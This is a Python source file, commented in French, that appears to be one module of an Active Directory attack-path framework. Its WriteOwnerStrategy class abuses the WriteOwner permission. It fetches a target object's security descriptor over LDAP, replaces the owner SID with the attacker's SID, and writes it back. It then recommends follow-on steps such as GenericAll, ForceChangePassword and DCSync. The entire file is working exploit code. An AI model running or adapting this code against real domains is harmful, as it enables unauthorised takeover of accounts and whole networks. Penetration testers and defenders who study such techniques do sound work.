import logging
from impacket.ldap import ldap, ldaptypes
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from ldap3 import MODIFY_REPLACE

from entities.edge import Edge
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind

logger = logging.getLogger(__name__)


class WriteOwnerStrategy:
    """
    Exploite la permission WriteOwner sur un objet AD.
    
    Chaîne d'attaque :
        WriteOwner → setOwner(source) → addGenericAll → contrôle total
    """

    def __init__(self, client_entity):
        """
        :param client_entity: doit exposer .ldap_connection, .domain, .username, .get_sid()
        """
        self.client = client_entity

    # ------------------------------------------------------------------ #
    #  Point d'entrée principal                                           #
    # ------------------------------------------------------------------ #

    def exploit(self, edge: Edge) -> ExploitResult:
        # 1. Validation de l'edge
        if edge.kind != EdgeKind.WRITE_OWNER:
            return ExploitResult(
                technique="WriteOwner",
                edge=edge,
                success=False,
                notes=f"Edge invalide : attendu WRITE_OWNER, reçu {edge.kind}"
            )

        target_dn  = edge.goal_node.distinguished_name   # ex: CN=AdminUser,DC=corp,DC=local
        source_sid = edge.source_node.objectid             # SID du compte attaquant

        logger.info(f"[WriteOwner] {edge.source_node.label} → {edge.goal_node.label}")

        try:
            # 2. Récupérer le descripteur de sécurité actuel
            raw_sd = self._fetch_security_descriptor(target_dn)

            # 3. Modifier le OwnerSid
            new_sd_bytes = self._replace_owner(raw_sd, source_sid)

            # 4. Réécrire l'attribut LDAP
            self._write_security_descriptor(target_dn, new_sd_bytes)

            logger.info(f"[WriteOwner] ✅ Propriétaire de {edge.goal_node.label} → {edge.source_node.label}")

            return ExploitResult(
                technique="WriteOwner",
                edge=edge,
                success=True,
                notes=(
                    f"OwnerSid de '{edge.goal_node.label}' remplacé par "
                    f"'{edge.source_node.label}' ({source_sid})"
                ),
                # Étape suivante recommandée dans la chaîne
                next_steps=["GenericAll", "ForceChangePassword", "DCSync"]
            )

        except PermissionError as e:
            return self._fail(edge, f"Droits insuffisants : {e}")
        except Exception as e:
            logger.exception("[WriteOwner] Erreur inattendue")
            return self._fail(edge, str(e))

    # ------------------------------------------------------------------ #
    #  Helpers privés                                                     #
    # ------------------------------------------------------------------ #

    def _fetch_security_descriptor(self, target_dn: str) -> bytes:
        """Récupère le nTSecurityDescriptor brut (bytes) depuis l'AD."""
        conn = self.client.ldap_connection   # ldap3 Connection

        # OWNER_SECURITY_INFORMATION = 0x01 → on ne demande que le owner
        conn.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            attributes=["nTSecurityDescriptor"],
            controls=[("1.2.840.113556.1.4.801", True, b"\x30\x03\x02\x01\x01")]
            #          ↑ LDAP_SERVER_SD_FLAGS_OID : demande uniquement Owner+Group
        )

        if not conn.entries:
            raise ValueError(f"Objet introuvable : {target_dn}")

        raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
        if not raw:
            raise ValueError(f"nTSecurityDescriptor vide pour {target_dn}")

        return raw[0]

    def _replace_owner(self, raw_sd: bytes, new_owner_sid: str) -> bytes:
        """Parse le Security Descriptor et remplace l'OwnerSid."""
        sd = SR_SECURITY_DESCRIPTOR()
        sd.fromString(raw_sd)

        # Vérification : log l'ancien propriétaire pour traçabilité
        old_owner = sd["OwnerSid"].formatCanonical()
        logger.debug(f"[WriteOwner] Ancien owner SID : {old_owner}")

        # Remplacement
        new_sid = LDAP_SID()
        new_sid.fromCanonical(new_owner_sid)
        sd["OwnerSid"] = new_sid

        return sd.getData()

    def _write_security_descriptor(self, target_dn: str, sd_bytes: bytes) -> None:
        """Réécrit le nTSecurityDescriptor modifié sur l'objet cible."""
        conn = self.client.ldap_connection

        result = conn.modify(
            dn=target_dn,
            changes={"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_bytes])]}
        )

        if not result:
            raise PermissionError(
                f"Échec de la modification LDAP : {conn.result['description']}"
            )

    @staticmethod
    def _fail(edge: Edge, reason: str) -> ExploitResult:
        logger.warning(f"[WriteOwner] ❌ {reason}")
        return ExploitResult(
            technique="WriteOwner",
            edge=edge,
            success=False,
            notes=reason
        )